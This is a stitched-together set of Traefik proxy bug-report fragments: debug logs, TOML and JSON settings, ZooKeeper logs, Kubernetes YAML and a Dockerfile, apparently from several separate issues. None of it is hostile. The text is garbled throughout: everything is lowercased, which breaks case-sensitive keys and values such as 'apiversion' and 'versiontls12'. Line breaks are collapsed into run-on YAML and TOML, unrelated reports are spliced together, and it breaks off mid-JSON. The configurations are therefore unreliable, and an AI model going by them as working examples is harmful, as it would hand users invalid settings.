info[2017-09-06t14:21:25+08:00] traefik version v1.3.7 built on 2017-08-25_08:56:06pm info[2017-09-06t14:21:25+08:00] using toml configuration file conf.toml debu[2017-09-06t14:21:25+08:00] global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":{"node":"55554a49-200f-4f89-9928-b1852034ca7e","store":{"store":{},"prefix":"traefik"}},"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":{"watch":true,"filename":"","constraints":null,"endpoint":"unix:///var/run/docker.sock","domain":"docker.local","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false},"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":{"watch":true,"filename":"","constraints":[],"endpoint":"172.31.32.250:12181","prefix":"traefik","tls":null,"username":"","password":""},"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null} info[2017-09-06t14:21:25+08:00] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false} info[2017-09-06t14:21:25+08:00] starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"endpoint":"unix:///var/run/docker.sock","domain":"docker.local","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false} info[2017-09-06t14:21:25+08:00] starting provider *server.webprovider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":null} info[2017-09-06t14:21:25+08:00] starting provider *zk.provider {"watch":true,"filename":"","constraints":[],"endpoint":"172.31.32.250:12181","prefix":"traefik","tls":null,"username":"","password":""} info[2017-09-06t14:21:25+08:00] starting server on :80 debu[2017-09-06t14:21:25+08:00] node 55554a49-200f-4f89-9928-b1852034ca7e running for election info[2017-09-06t14:21:25+08:00] node 55554a49-200f-4f89-9928-b1852034ca7e elected slave 2017/09/06 14:21:25 structs.go:21: connected to 172.31.32.250:12181
debu[2017-09-06t14:21:25+08:00] provider connection established with docker 17.05.0-ce (api 1.29) 2017/09/06 14:21:25 structs.go:21: authenticated: id=98004296028783521, timeout=30000
2017/09/06 14:21:25 structs.go:21: re-submitting `0` credentials after reconnect
debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_9 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_8 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_4 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_10 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_6 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_7 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_3 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_2 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_5 debu[2017-09-06t14:21:25+08:00] filtering disabled container /simpleweb_server_1 debu[2017-09-06t14:21:25+08:00] filtering container without port and no traefik.port label /registrator debu[2017-09-06t14:21:25+08:00] configuration received from provider docker: {} debu[2017-09-06t14:21:25+08:00] last docker config received more than 2s, ok info[2017-09-06t14:21:25+08:00] server configuration reloaded on :80 info[2017-09-06t14:21:25+08:00] node 55554a49-200f-4f89-9928-b1852034ca7e elected leader debu[2017-09-06t14:21:25+08:00] cannot get key traefik/alias key not found in store, setting default traefik debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/loadbalancer/method key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/maxconn/amount key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/alias key not found in store, setting default traefik debu[2017-09-06t14:21:25+08:00] validation of load balancer method for backend backend_web failed: invalid load-balancing method ''
using default method wrr
debu[2017-09-06t14:21:25+08:00] configuration received from provider zk: {"backends":{"backend_web":{"servers":{"server1":{"url":" ","weight":6},"server2":{"url":" ","weight":2},"server3":{"url":" ","weight":5}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend3":{"entrypoints":[""],"backend":"backend_web","routes":{"test_1":{"rule":"path:/web_root/web/{subdomain:[a-z]+}"}},"passhostheader":true,"priority":10,"basicauth":null}}} debu[2017-09-06t14:21:25+08:00] last zk config received less than 2s, waiting..
debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/circuitbreaker/expression key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/loadbalancer/method key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/loadbalancer/sticky key not found in store, setting default false debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/maxconn/amount key not found in store, setting default debu[2017-09-06t14:21:25+08:00] cannot get key traefik/backends/backend_web/maxconn/extractorfunc key not found in store, setting default debu[2017-09-06t14:21:25+08:00] validation of load balancer method for backend backend_web failed: invalid load-balancing method ''
using default method wrr
debu[2017-09-06t14:21:25+08:00] configuration received from provider zk: {"backends":{"backend_web":{"servers":{"server1":{"url":" ","weight":6},"server2":{"url":" ","weight":2},"server3":{"url":" ","weight":5}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend3":{"entrypoints":[""],"backend":"backend_web","routes":{"test_1":{"rule":"path:/web_root/web/{subdomain:[a-z]+}"}},"passhostheader":true,"priority":10,"basicauth":null}}} debu[2017-09-06t14:21:25+08:00] last zk config received less than 2s, waiting..
debu[2017-09-06t14:21:27+08:00] waited for zk config, ok debu[2017-09-06t14:21:27+08:00] creating frontend frontend3 debu[2017-09-06t14:21:27+08:00] wiring frontend frontend3 to entrypoint erro[2017-09-06t14:21:27+08:00] undefined entrypoint '' for frontend frontend3 erro[2017-09-06t14:21:27+08:00] skipping frontend frontend3..
info[2017-09-06t14:21:27+08:00] server configuration reloaded on :80 ``` zookeeper log
2017-09-06 06:21:25,827 [myid:] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:nioservercnxnfactory@192] - accepted socket connection from /172.31.32.92:43150
2017-09-06 06:21:25,827 [myid:] - warn [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@896] - connection request from old client /172.31.32.92:43150; will be dropped if server is in r-o mode
2017-09-06 06:21:25,828 [myid:] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@942] - client attempting to establish new session at /172.31.32.92:43150
2017-09-06 06:21:25,843 [myid:] - info [syncthread:0:zookeeperserver@687] - established session with negotiated timeout 30000 for client /172.31.32.92:43150
2017-09-06 06:21:25,866 [myid:] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:nioservercnxnfactory@192] - accepted socket connection from /172.31.32.92:43151
2017-09-06 06:21:25,867 [myid:] - warn [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@896] - connection request from old client /172.31.32.92:43151; will be dropped if server is in r-o mode
2017-09-06 06:21:25,867 [myid:] - info [nioservercxn.factory:0.0.0.0/0.0.0.0:2181:zookeeperserver@942] - client attempting to establish new session at /172.31.32.92:43151
2017-09-06 06:21:25,876 [myid:] - info [syncthread:0:zookeeperserver@687] - established session with negotiated timeout 30000 for client /172.31.32.92:43151
``` </details> <br/> ![issue1](
none ### if applicable, please paste the log output in debug mode (`--debug` switch)
#
# loglevel = "info"
checknewversion = false
defaultentrypoints = ["http", "https"] traefiklogsfile = "/opt/log/traefik.log" [accesslog] filepath = "/opt/log/access.log" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [web] address = ":8080" [web.statistics] recenterrors = 10 [web.auth.basic] users = ["admin:redacted"] [docker] endpoint = "unix:///var/run/docker.sock" domain = "redacted" watch = true exposedbydefault = false [acme] email = "redatced" entrypoint = "https" onhostrule = true # prod storage = "/opt/ssl/acme/acme.json" # staging # storage = "/opt/ssl/acme/acme-staging.json" # caserver = " " ```
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
{ "gracetimeout": 10000000000, "debug": false, "checknewversion": true, "accesslogsfile": "", "traefiklogsfile": "", "loglevel": "error", "entrypoints": { "http": { "network": "", "address": ":80", "tls": null, "redirect": { "entrypoint": "https", "regex": "", "replacement": "" }, "auth": null, "compress": false }, "https": { "network": "", "address": ":443", "tls": { "minversion": "versiontls12", "ciphersuites": [ "tls_ecdhe_ecdsa_with_aes_256_gcm_sha384", "tls_ecdhe_rsa_with_aes_256_gcm_sha384", "tls_ecdhe_ecdsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha256", "tls_ecdhe_rsa_with_aes_128_cbc_sha256" ], "certificates": null, "clientcafiles": null }, "redirect": null, "auth": null, "compress": false } }, "cluster": null, "constraints": [], "acme": { "email": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domains": null, "storage": "", "storagefile": "/var/lib/traefik/acme.json", "ondemand": false, "onhostrule": true, "caserver": "", "entrypoint": "https", "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": true, "tlsconfig": null }, "defaultentrypoints": [ "https" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 180000000000, "insecureskipverify": false, "retry": null, "healthcheck": { "interval": 30000000000 }, "docker": { "watch": true, "filename": "", "constraints": null, "endpoint": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "domain": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "tls": null, "exposedbydefault": false, "usebindportip": false, "swarmmode": false }, "file": null, "web": { "address": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxx", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/etc/traefik.toml"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
sep 03 21:03:28 testserver01 traefik[17972]: time="2017-09-03t21:03:28z" level=debug msg="look for provided certificate to validate [${host}]..."
sep 03 21:03:28 testserver01 traefik[17972]: time="2017-09-03t21:03:28z" level=debug msg="no provided certificate found for domains [${host}], get acme certificate."
sep 03 21:03:28 testserver01 traefik[17972]: time="2017-09-03t21:03:28z" level=debug msg="challenge getcertificate ${host}"
sep 03 21:03:28 testserver01 traefik[17972]: time="2017-09-03t21:03:28z" level=debug msg="acme got domain cert ${host}"
sep 03 21:03:28 testserver01 traefik[17972]: time="2017-09-03t21:03:28z" level=warning msg="error dialing `${host}`: websocket: bad handshake"
sep 03 21:03:29 testserver01 traefik[17972]: time="2017-09-03t21:03:29z" level=debug msg="look for provided certificate to validate [${host}]..."
sep 03 21:03:29 testserver01 traefik[17972]: time="2017-09-03t21:03:29z" level=debug msg="no provided certificate found for domains [${host}], get acme certificate."
sep 03 21:03:29 testserver01 traefik[17972]: time="2017-09-03t21:03:29z" level=debug msg="challenge getcertificate ${host}"
sep 03 21:03:29 testserver01 traefik[17972]: time="2017-09-03t21:03:29z" level=debug msg="acme got domain cert ${host}"
sep 03 21:03:29 testserver01 traefik[17972]: time="2017-09-03t21:03:29z" level=warning msg="error dialing `${host}`: websocket: bad handshake"
{ "gracetimeout": 10000000000, "debug": false, "checknewversion": true, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "loglevel": "error", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": { "readtimeout": 0, "writetimeout": 0, "idletimeout": 180000000000 }, "forwardingtimeouts": { "dialtimeout": 30000000000, "responseheadertimeout": 0 }, "docker": null, "file": null, "web": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": ""
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
info[0000] using toml configuration file /home/ubuntu/deploy-swarm/sample.toml
info[2017-09-01t11:50:37z] traefik version v1.4.0-rc1 built on 2017-08-29_08:16:35am
debu[2017-09-01t11:50:37z] global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":{"readtimeout":0,"writetimeout":0,"idletimeout":180000000000},"forwardingtimeouts":{"dialtimeout":30000000000,"responseheadertimeout":0},"docker":null,"file":{"watch":true,"filename":"/home/ubuntu/deploy-swarm/sample.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":"/conf/"},"web":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}
info[2017-09-01t11:50:37z] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:false} with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2017-09-01t11:50:37z] starting provider *file.provider {"watch":true,"filename":"/home/ubuntu/deploy-swarm/sample.toml","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"directory":"/conf/"}
info[2017-09-01t11:50:37z] starting server on :80
erro[2017-09-01t11:50:37z] error starting provider *file.provider: error reading configuration file: near line 5 (last key parsed 'backends.backend2'): bare keys cannot contain '{'
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" [entrypoints.https.tls]
email = "certmaster@example.com"
storage = "/acme/acme.json"
entrypoint = "https"
ondemand = false
onhostrule = true
acmelogging = true
caserver = " "
acmelogging = true
```yml labels: - traefik.docker.network=traefik-net - traefik.web.backend=unimatrix01 - traefik.web.port=8443 - traefik.web.protocol=https - traefik.web.frontend.entrypoints=https - traefik.web.frontend.rule=host:unifi.domain.nl - traefik.web.frontend.passhostheader=true - traefik.wss.backend=unimatrix01-wss - traefik.wss.port=8443 - traefik.wss.protocol=wss - traefik.wss.frontend.entrypoints=wss - traefik.wss.frontend.rule=host:unifi.domain.nl - traefik.wss.frontend.passhostheader=true ```
### if applicable, please paste the log output in debug mode (`--debug` switch) <details>
<summary>logs</summary> ```shell
time="2017-08-28t07:55:06z" level=debug msg="round trip: code: 200, duration: 64.262132ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:06z" level=debug msg="round trip: code: 200, duration: 11.44723ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:06z" level=debug msg="round trip: code: 200, duration: 26.794852ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:06z" level=debug msg="round trip: code: 200, duration: 33.944042ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:07z" level=debug msg="round trip: code: 200, duration: 89.152819ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:07z" level=debug msg="round trip: code: 200, duration: 90.137627ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:07z" level=debug msg="round trip: code: 200, duration: 356.133366ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 4.436681ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 5.733553ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 11.047605ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 13.611676ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 18.619137ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 28.781235ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 33.181069ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 41.56683ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 40.741497ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 41.649026ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 53.701673ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 1.95412ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 2.993477ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 2.527031ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 3.797639ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 7.01197ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 4.755883ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 6.638979ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:08z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:08z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:08z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 13.311899ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 14.316977ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 16.058965ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:08z" level=debug msg="round trip: code: 200, duration: 132.422269ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:unifi.domain.nl"
time="2017-08-28t07:55:09z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:09z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:09z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:09z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:09z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:09z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:09z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:09z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:09z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:10z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:10z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:10z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:10z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:10z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:10z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:12z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:12z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:12z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:12z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:12z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:14z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:14z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:14z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:14z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:14z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:23z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:23z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:23z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:23z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:23z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:28z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:28z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:28z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:28z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:28z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
time="2017-08-28t07:55:40z" level=debug msg="look for provided certificate to validate [unifi.domain.nl]..."
time="2017-08-28t07:55:40z" level=debug msg="no provided certificate found for domains [unifi.domain.nl], get acme certificate."
time="2017-08-28t07:55:40z" level=debug msg="challenge getcertificate unifi.domain.nl"
time="2017-08-28t07:55:40z" level=debug msg="acme got domain cert unifi.domain.nl"
time="2017-08-28t07:55:40z" level=warning msg="error dialing `unifi.domain.nl`: x509: cannot validate certificate for 172.22.0.9 because it doesn\'t contain any ip sans"
``` </details>
**configmap.yaml**
apiversion: v1
data: traefik.toml: | defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = ["tls_rsa_with_aes_256_gcm_sha384"] [[entrypoints.https.tls.certificates]] certfile = "/ssl/wildcard.foo.mydomain.com.crt" keyfile = "/ssl/wildcard.foo.mydomain.com.key" [[entrypoints.https.tls.certificates]] certfile = "/ssl/wildcard.mydomain.com.crt" keyfile = "/ssl/wildcard.mydomain.com.key" [[entrypoints.https.tls.certificates]] certfile = "/ssl/wildcard.local.crt" keyfile = "/ssl/wildcard.local.key" [kubernetes] labelselector = "expose=internal"
kind: configmap
metadata: annotations: documentation: es_index: | {"cluster-traefik":"kubernetes-cluster_traefik"} maintainers: systems:systems@mydomain.com sandbox: "true" source: labels: app: traefik project: kube release: cluster-traefik role: traefik subproject: cluster1 name: cluster-traefik namespace: cluster
``` **deployment.yaml**
apiversion: apps/v1beta1
kind: deployment
metadata: annotations: documentation: es_index: | {"cluster-traefik":"kubernetes-cluster_traefik"} maintainers: systems:systems@mydomain.com source: labels: app: traefik project: kube release: cluster-traefik role: traefik subproject: cluster1 name: cluster-traefik namespace: cluster
spec: replicas: 3 selector: matchlabels: app: traefik project: kube release: cluster-traefik role: traefik subproject: cluster1 strategy: rollingupdate: maxsurge: 1 maxunavailable: 1 type: rollingupdate template: metadata: annotations: documentation: es_index: "{\\"cluster-traefik\\":\\"kubernetes-cluster_traefik\\"}\ \ " maintainers: systems:systems@mydomain.com prometheus.io/scheme: http prometheus.io/scrape: "true" sandbox: "true" source: labels: app: traefik project: kube release: cluster-traefik role: traefik subproject: cluster1 name: cluster-traefik spec: containers: - args: - --configfile=/config/traefik.toml - --web - --web.metrics.prometheus - --loglevel=debug image: registry.mydomain.com/ops/traefik:v1.3.0-4 imagepullpolicy: ifnotpresent name: cluster-traefik ports: - containerport: 80 protocol: tcp - containerport: 443 protocol: tcp - containerport: 8080 name: metrics protocol: tcp terminationmessagepath: /dev/termination-log terminationmessagepolicy: file volumemounts: - mountpath: /config name: config - mountpath: /ssl name: ssl resources: requests: cpu: 1 memory: 256mi dnspolicy: clusterfirst restartpolicy: always schedulername: default-scheduler securitycontext: {} serviceaccount: cluster-traefik serviceaccountname: cluster-traefik terminationgraceperiodseconds: 60 volumes: - configmap: defaultmode: 420 name: cluster-traefik name: config - name: ssl secret: defaultmode: 420 secretname: traefik-certs
``` **dockerfile**
```dockerfile
from registry.mydomain.com/centos/7/base:7.2.1511 # labels
label com.mydomain.traefik.version="1.3.0" copy sha256sums.txt /tmp/ run cd /tmp && \\ curl -l -s --fail -o traefik_linux-amd64 && \\ sha256sum --check sha256sums.txt && \\ chmod a+x traefik_linux-amd64 && \\ mv traefik_linux-amd64 /usr/local/bin/traefik && \\ rm -rf /tmp/*
entrypoint ["/usr/local/bin/traefik"] label com.mydomain.build.gitrepo=\'docker-images/centos-7-traefik\' \\ com.mydomain.build.gitsha=\'03ff2b9\' \\ com.mydomain.build.timestamp=\'1503496482\' \\ com.mydomain.build.user=\'k4k\' \\ com.mydomain.build.dependency=\'centos/7/base:7.2.1511-39\'
### if applicable, please paste the log output in debug mode (`--debug` switch) `--loglevel=debug` ```shell
time="2017-08-23t14:00:25z" level=info msg="traefik version v1.3.0 built on 2017-05-31_05:27:18pm"
time="2017-08-23t14:00:25z" level=info msg="using toml configuration file /config/traefik.toml"
time="2017-08-23t14:00:25z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":false,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":{"entrypoint":"https","regex":"","replacement":""},"auth":null,"compress":false},"https":{"network":"","address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":[{"certfile":"/ssl/wildcard.foo.mydomain.com.crt","keyfile":"/ssl/wildcard.foo.mydomain.com.key"},{"certfile":"/ssl/wildcard.mydomain.com.crt","keyfile":"/ssl/wildcard.mydomain.com.key"},{"certfile":"/ssl/wildcard.local.crt","keyfile":"/ssl/wildcard.local.key"}],"clientcafiles":null},"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":null,"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics